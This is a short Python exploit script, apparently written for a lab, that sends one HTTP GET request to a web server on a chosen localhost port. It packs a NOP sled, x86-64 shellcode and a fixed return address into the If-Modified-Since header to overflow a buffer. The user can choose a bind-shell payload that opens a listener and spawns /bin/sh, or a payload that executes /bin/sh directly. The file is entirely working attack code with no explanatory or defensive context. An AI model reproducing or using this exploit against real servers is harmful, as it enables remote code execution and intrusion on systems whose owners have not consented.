#!/usr/bin/env python3

import argparse
import requests

def retNoOP(number):
    return b"\x90"*number

def getRequest(port, shellcode):
    rip = b"\xc0\xf4\x5a\xf7\xff\x7f"
    bindshell = b"\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"
    execsh = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    url = f"http://localhost:{port}"
    if shellcode == 'bindshell':
        payload = retNoOP(650) + bindshell + retNoOP(347) + rip
        headers = {"If-Modified-Since":payload}
    else:
        payload = retNoOP(601) + execsh + retNoOP(500) + rip
        headers = {"If-Modified-Since":payload}
    req = requests.get(url, headers=headers)

def main():
    parser = argparse.ArgumentParser(allow_abbrev=False)
    parser.add_argument('-tp', '--targetport', help='add port of the target', required=True, action='store', type=int, metavar='\b')
    parser.add_argument('-sc', '--shellCode', help='Shell code to user', required=True, action='store', type=str, metavar='\b')
    args = parser.parse_args()
    port = args.targetport
    shellCode = args.shellCode

    if (shellCode == 'bindshell' or shellCode == 'execsh'):
        getRequest(port, shellCode)
    else:
        print("Wrong shell code")

if __name__ == '__main__':
    main()
